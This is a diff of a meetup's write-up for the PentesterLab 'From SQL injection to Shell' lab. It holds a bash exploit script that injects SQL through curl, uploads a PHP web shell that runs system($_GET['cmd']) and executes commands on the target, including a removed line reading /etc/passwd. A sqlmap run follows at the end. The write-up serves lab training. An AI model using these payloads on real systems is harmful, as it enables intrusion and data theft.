@@ -118,8 +118,8 @@
 <li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
 <li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
 <li class="toctree-l2 current"><a class="current reference internal" href="#">3.24. PentesterLab From SQL injection to Shell</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#manual-sql-injection">3.24.1. manual SQL injection</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#exploit-simplification-with-sqlmap">3.24.2. exploit simplification with sqlmap</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#manual-sql-injection">3.24.1. Manual SQL injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#exploit-simplification-with-sqlmap">3.24.2. Exploit simplification with sqlmap</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
@@ -204,10 +204,10 @@
             
   <div class="section" id="pentesterlab-from-sql-injection-to-shell">
 <span id="pentesterlabsqli2shell"></span><h1>3.24. PentesterLab From SQL injection to Shell<a class="headerlink" href="#pentesterlab-from-sql-injection-to-shell" title="Permalink to this headline">¶</a></h1>
-<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://pentesterlab.com/exercises/from_sqli_to_shell/">PentesterLab From SQL injection to Shell</a>. PentesterLab’s writeup <a class="reference external" href="http://download.vulnhub.com/pentesterlab/from_sqli_to_shell.pdf">from_sqli_to_shell.pdf</a> is a very thorough and complete description of the browser-based approach to solving the challenge and we won’t reproduce that here. There are 2 other approaches: a command-line equivalent to the documented browser-based approach, and the much simpler approach using <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a>. Here we document the 2 other approaches: first we provide a quick-and-dirty shell script that can be cut-and-pasted into the command line; second, we show the impressively short <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. We recommend going through the manual browser or command line version of the challenge first to learn the concepts. Then step through the <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> version to appreciate all the steps handled by <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> behind the scenes.</p>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://pentesterlab.com/exercises/from_sqli_to_shell/">PentesterLab From SQL injection to Shell</a>. PentesterLab’s writeup is online at <a class="reference external" href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">From SQL Injection to Shell</a> and an older version at <a class="reference external" href="http://download.vulnhub.com/pentesterlab/from_sqli_to_shell.pdf">from_sqli_to_shell.pdf</a>. The writeups are a very thorough description of the browser-based approach to solving the challenge and we won’t reproduce that here. There are 2 other approaches: a command-line equivalent to the documented browser-based approach, and the much simpler approach using <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a>. Here we document 2 other approaches: first we provide a quick-and-dirty shell script that can be cut-and-pasted into the command line; second, we show the impressively short <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. We recommend going through the manual browser or command line version of the challenge first to learn the concepts. Then step through the <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> version to appreciate all the steps handled by <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> behind the scenes.</p>
 <p>The VM is provided as an iso file so should run on any virtualization platform. For configuration purposes the OS is Debian 6.0.5. The VM is called vulnerable and boots directly into a shell session.</p>
 <div class="section" id="manual-sql-injection">
-<h2>3.24.1. manual SQL injection<a class="headerlink" href="#manual-sql-injection" title="Permalink to this headline">¶</a></h2>
+<h2>3.24.1. Manual SQL injection<a class="headerlink" href="#manual-sql-injection" title="Permalink to this headline">¶</a></h2>
 <p>Download <a class="reference download internal" href="../_downloads/from_sql_injection_to_shell_exploit.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">from_sql_injection_to_shell_exploit.sh</span></code></a>, the manual, step-by-step command line script for the challenge. Run <code class="docutils literal notranslate"><span class="pre">./from_sql_injection_to_shell_exploit.sh</span> <span class="pre">IP</span></code> where IP is vulnerable’s IP address.</p>
 <div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
 
@@ -217,12 +217,12 @@
 <span class="k">fi</span>
 
 <span class="nv">TARGET</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
-<span class="nv">QUERY</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=&quot;</span>
+<span class="nv">QUERY</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php&quot;</span>
 
 <span class="c1"># function executing vulnerable MySQL query</span>
 <span class="k">function</span> mysql_fetch<span class="o">()</span> <span class="o">{</span>
-  <span class="nv">ARG</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="p">// /%20</span><span class="si">}</span><span class="s2">&quot;</span>
-  <span class="nv">MYSQL_RET</span><span class="o">=</span><span class="k">$(</span>curl --silent <span class="nv">$QUERY$ARG</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span>
+  <span class="nv">MYSQL_RET</span><span class="o">=</span><span class="k">$(</span>curl --silent --get <span class="nv">$QUERY</span> <span class="se">\</span>
+		   --data-urlencode <span class="s2">&quot;id=</span><span class="nv">$1</span><span class="s2">&quot;</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span>
   <span class="c1"># error message wrapped between &lt;div id=&quot;content&quot;&gt; and &lt;div class=...</span>
   <span class="nv">MYSQL_ERR</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="nv">$MYSQL_RET</span> <span class="p">|</span> <span class="se">\</span>
     sed -e <span class="s1">&#39;s/^.*&lt;div id=&quot;content&quot;&gt;//;</span>
@@ -329,9 +329,9 @@ cat ~/.john/john.pot
 
 <span class="c1"># using admin/P4ssw0rd upload a shell execution php script and run a few commands</span>
 <span class="nb">echo</span> -e <span class="s2">&quot;\nUploading shell.php3 then using it to execute shell commands on vulnerable:&quot;</span>
-cat &gt;shell.php3 <span class="s">&lt;&lt;EOF</span>
+cat &gt;shell.php3 <span class="s">&lt;&lt;&#39;EOF&#39;</span>
 <span class="s">&lt;?php</span>
-<span class="s">system(\$_GET[&#39;cmd&#39;]);</span>
+<span class="s">system($_GET[&#39;cmd&#39;]);</span>
 <span class="s">?&gt;</span>
 <span class="s">EOF</span>
 curl --silent --form <span class="nv">action</span><span class="o">=</span>index.php --form <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;shell&quot;</span> <span class="se">\</span>
@@ -340,14 +340,16 @@ curl --silent --form <span class="nv">action</span><span class="o">=</span>index
     http://<span class="nv">$TARGET</span>/admin/index.php <span class="p">|</span> <span class="se">\</span>
     grep INSERT
 <span class="nb">echo</span> -e <span class="s2">&quot;\nRun the command \&quot;uname -a\&quot;&quot;</span>
-curl --silent http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3?cmd<span class="o">=</span>uname%20-a
-<span class="nb">echo</span> -e <span class="s2">&quot;\nRun the command \&quot;cat /etc/passwd\&quot;&quot;</span>
-curl --silent http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3?cmd<span class="o">=</span>cat%20/etc/passwd
+curl --silent --get http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3 <span class="se">\</span>
+     --data-urlencode <span class="s2">&quot;cmd=uname -a&quot;</span>
+<span class="nb">echo</span> -e <span class="s2">&quot;\nRun the command \&quot;cat /etc/debian_version\&quot;&quot;</span>
+curl --silent --get http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3 <span class="se">\</span>
+     --data-urlencode <span class="s2">&quot;cmd=cat /etc/debian_version&quot;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="exploit-simplification-with-sqlmap">
-<h2>3.24.2. exploit simplification with sqlmap<a class="headerlink" href="#exploit-simplification-with-sqlmap" title="Permalink to this headline">¶</a></h2>
+<h2>3.24.2. Exploit simplification with sqlmap<a class="headerlink" href="#exploit-simplification-with-sqlmap" title="Permalink to this headline">¶</a></h2>
 <p>Here is the much simpler <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. Change TARGET to vulnerable’s IP address. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is run 4 times: (1) to verify SQL injection is possible; (2) to list available databases; (3) to list tables within a selected database; then (4) to dump the selected table (users). <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> provided the added benefit of cracking the password found in the users table. We leave off the uploading of the exploitation php script which you can use from the last few lines of the command line script immediately above. Here is the <code class="docutils literal notranslate"><span class="pre">bash</span></code> code:</p>
 <div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="c1"># Check to see if sql injection possible</span>
